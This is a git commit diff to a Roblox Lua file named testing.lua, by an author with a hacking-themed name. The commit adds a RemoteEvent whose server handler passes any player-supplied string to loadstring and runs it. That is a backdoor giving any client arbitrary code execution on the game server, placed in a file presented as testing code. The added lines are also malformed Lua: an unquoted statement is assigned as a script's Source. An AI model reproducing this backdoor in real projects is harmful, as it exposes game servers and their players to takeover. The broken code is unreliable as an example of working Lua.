1923a389818690fbab448605217ab763a4716ee7
c00lhackkscriptservice <iezafira11611@gmail.com>
2025-06-02 13:02:14 +0800

    Update testing.lua

--- testing.lua
+++ testing.lua
@@ -1,4 +1,7 @@
 local localScript = Instance.new("LocalScript")
  localScript.Name = "LocalScript"
- localScript.Source =  -- Insert the script code here as a string
+ localScript.Source = local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
+server.OnServerEvent:connect(function(player,SS)
+    loadstring(SS)()
+end) -- Insert the script code here as a string
  localScript.Parent = player:WaitForChild("PlayerGui") -- Parent it to PlayerGui or another local container
